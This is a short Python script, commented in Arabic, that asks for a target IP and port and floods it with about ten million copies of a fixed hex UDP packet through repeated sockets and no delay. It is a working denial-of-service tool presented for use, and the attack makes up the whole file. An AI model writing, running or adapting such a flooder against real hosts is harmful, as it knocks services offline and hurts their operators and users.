import socket
import time

ip = input("IP: ")
port = int(input("Port: "))
num_connections = 9999

packet = bytes.fromhex("F10400010900000001000000F2")
num_send_per_connection = 1000

for _ in range(num_connections):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:  # تغيير البروتوكول إلى UDP
        try:
            for _ in range(num_send_per_connection):
                s.sendto(packet, (ip, port))  # استخدام sendto لإرسال البيانات مع UDP
            
            print(f"Sent packets to {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")

        time.sleep(0)
